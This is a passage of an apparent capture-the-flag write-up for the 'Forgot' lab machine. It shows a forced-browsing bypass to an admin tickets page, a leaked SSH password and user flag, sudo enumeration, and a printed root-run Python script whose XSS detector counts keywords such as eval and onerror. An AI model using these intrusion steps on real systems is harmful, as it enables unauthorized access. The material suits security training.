</code></pre></div><p>Now we can set this cookie in the browser:</p><p><img alt="Forgot 14" src="/images/HTB/Forgot/Forgot-14.webp"></p><p>Curiosly, the username does not change in the webpage. Anyway, we can to click on &ldquo;Tickets (escalated)&rdquo;, but it is disabled in the HTML code:</p><p><img alt="Forgot 15" src="/images/HTB/Forgot/Forgot-15.webp"></p><p>This is not a problem, since we can put <code>/admin_tickets</code> directly in the URL bar:</p><p><img alt="Forgot 16" src="/images/HTB/Forgot/Forgot-16.webp"></p><p>And now we have credentials for <code>diego</code> (password: <code>dCb#1!x0%gjq</code>). Let&rsquo;s try to connect via SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> diego@10.10.11.188
diego@10.10.11.188's password:
<span class="code-green">diego@forgot</span>:<span class="code-blue">~</span>$ cat user.txt
22ddb2f559bed71e3f76886ccff8c4a2  
</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>A basic enumeration tells us what to do:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">diego@forgot</span>:<span class="code-blue">~</span>$ sudo -l
Matching Defaults entries for diego on forgot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  

User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
</code></pre></div><p>We are able to run a Python script as <code>root</code> with <code>sudo</code>. This is such script:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/python3</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">csv</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span>
<span class="mtk5">import</span><span class="mtk1"> mysql.connector</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">threading</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">numpy</span><span class="mtk1"> </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk8 mtku">np</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">pandas</span><span class="mtk1"> </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk8 mtku">pd</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">urllib</span><span class="mtk1">.</span><span class="mtk8 mtku">parse</span><span class="mtk1"> </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk8 mtku">parse</span>
<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">urllib</span><span class="mtk1">.</span><span class="mtk8 mtku">parse</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8">unquote</span>
<span class="mtk5">from</span><span class="mtk1"> sklearn </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk1">model_selection</span>
<span class="mtk5">from</span><span class="mtk1"> nltk.tokenize </span><span class="mtk5">import</span><span class="mtk1"> word_tokenize</span>
<span class="mtk5">from</span><span class="mtk1"> sklearn.linear_model </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk1">LogisticRegression</span>
<span class="mtk5">from</span><span class="mtk1"> gensim.models.doc2vec </span><span class="mtk5">import</span><span class="mtk1"> Doc2Vec, </span><span class="mtk1">TaggedDocument</span>
<span class="mtk5">from</span><span class="mtk1"> tensorflow.python.tools.saved_model_cli </span><span class="mtk5">import</span><span class="mtk1"> preprocess_input_exprs_arg_string</span>

<span class="mtk8 mtku">np</span><span class="mtk1">.</span><span class="mtk8 mtku">random</span><span class="mtk1">.</span><span class="mtk1">seed</span><span class="mtk1">(</span><span class="mtk6">42</span><span class="mtk1">)</span>

<span class="mtk1">f1</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'/opt/security/lib/DecisionTreeClassifier.sav'</span>
<span class="mtk1">f2</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'/opt/security/lib/SVC.sav'</span>
<span class="mtk1">f3</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'/opt/security/lib/GaussianNB.sav'</span>
<span class="mtk1">f4</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'/opt/security/lib/KNeighborsClassifier.sav'</span>
<span class="mtk1">f5</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'/opt/security/lib/RandomForestClassifier.sav'</span>
<span class="mtk1">f6</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'/opt/security/lib/MLPClassifier.sav'</span>

<span class="mtk3"># load the models from disk</span>
<span class="mtk1">loaded_model1</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">load</span><span class="mtk1">(</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk1">f1</span><span class="mtk1">, </span><span class="mtk4">'rb'</span><span class="mtk1">))</span>
<span class="mtk1">loaded_model2</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">load</span><span class="mtk1">(</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk1">f2</span><span class="mtk1">, </span><span class="mtk4">'rb'</span><span class="mtk1">))</span>
<span class="mtk1">loaded_model3</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">load</span><span class="mtk1">(</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk1">f3</span><span class="mtk1">, </span><span class="mtk4">'rb'</span><span class="mtk1">))</span>
<span class="mtk1">loaded_model4</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">load</span><span class="mtk1">(</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk1">f4</span><span class="mtk1">, </span><span class="mtk4">'rb'</span><span class="mtk1">))</span>
<span class="mtk1">loaded_model5</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">load</span><span class="mtk1">(</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk1">f5</span><span class="mtk1">, </span><span class="mtk4">'rb'</span><span class="mtk1">))</span>
<span class="mtk1">loaded_model6</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">pickle</span><span class="mtk1">.</span><span class="mtk8">load</span><span class="mtk1">(</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk1">f6</span><span class="mtk1">, </span><span class="mtk4">'rb'</span><span class="mtk1">))</span>
<span class="mtk1">model</span><span class="mtk5">=</span><span class="mtk1"> Doc2Vec.load(</span><span class="mtk4">"/opt/security/lib/d2v.model"</span><span class="mtk1">)</span>

<span class="mtk3"># Create a function to convert an array of strings</span><span class="mtk3"> to a set of features</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">getVec</span><span class="mtk1">(</span><span class="mtk9 mtki">text</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">features</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> []</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">, </span><span class="mtk1">line</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">enumerate</span><span class="mtk1">(</span><span class="mtk9 mtki">text</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">test_data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> word_tokenize(</span><span class="mtk1">line</span><span class="mtk1">.lower())</span>
<span class="mtk1">        </span><span class="mtk1">v1</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">model</span><span class="mtk1">.infer_vector(</span><span class="mtk1">test_data</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">featureVec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">v1</span>
<span class="mtk1">        </span><span class="mtk1">lineDecode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">unquote</span><span class="mtk1">(</span><span class="mtk1">line</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">lowerStr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">lineDecode</span><span class="mtk1">).</span><span class="mtk8">lower</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'link'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'object'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'form'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'embed'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'ilayer'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'layer'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'style'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'applet'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'meta'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'img'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'iframe'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature1</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'marquee'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk3"># add feature for malicious method count</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'exec'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'fromcharcode'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'eval'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'alert'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'getelementsbytagname'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'write'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'unescape'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'escape'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'prompt'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'onload'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'onclick'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'onerror'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'onpage'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature2</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'confirm'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk3"># add feature for ".js" count</span>
<span class="mtk1">        </span><span class="mtk1">feature3</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'.js'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk3"># add feature for "javascript" count</span>
<span class="mtk1">        </span><span class="mtk1">feature4</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'javascript'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk3"># add feature for length of the string</span>
<span class="mtk1">        </span><span class="mtk1">feature5</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk3"># add feature for "&lt;script"  count</span>
<span class="mtk1">        </span><span class="mtk1">feature6</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'script'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature6</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'&lt;script'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature6</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'&amp;lt;script'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature6</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk6">%3c</span><span class="mtk4">script'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature6</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk6">%3c%73%</span><span class="mtk4">63</span><span class="mtk6">%72%</span><span class="mtk4">69</span><span class="mtk6">%70%</span><span class="mtk4">74'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk3"># add feature for special character count</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'&amp;'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'&lt;'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'&gt;'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'"'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk6">\'</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'%'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'*'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">';'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'+'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'='</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk1">feature7</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'%3C'</span><span class="mtk1">))</span>
<span class="mtk1">        </span><span class="mtk3"># add feature for http count</span>
<span class="mtk1">        </span><span class="mtk1">feature8</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">lowerStr</span><span class="mtk1">.</span><span class="mtk8">count</span><span class="mtk1">(</span><span class="mtk4">'http'</span><span class="mtk1">))</span>

<span class="mtk1">        </span><span class="mtk3"># append the features</span>
<span class="mtk1">        </span><span class="mtk1">featureVec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">np</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">featureVec</span><span class="mtk1">,</span><span class="mtk1">feature1</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">featureVec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">np</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">featureVec</span><span class="mtk1">,</span><span class="mtk1">feature2</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">featureVec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">np</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">featureVec</span><span class="mtk1">,</span><span class="mtk1">feature3</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">featureVec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">np</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">featureVec</span><span class="mtk1">,</span><span class="mtk1">feature4</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">featureVec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">np</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">featureVec</span><span class="mtk1">,</span><span class="mtk1">feature5</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">featureVec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">np</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">featureVec</span><span class="mtk1">,</span><span class="mtk1">feature6</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">featureVec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">np</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">featureVec</span><span class="mtk1">,</span><span class="mtk1">feature7</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">featureVec</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">np</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">featureVec</span><span class="mtk1">,</span><span class="mtk1">feature8</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">features</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">featureVec</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">features</span>


<span class="mtk3"># Grab links</span>
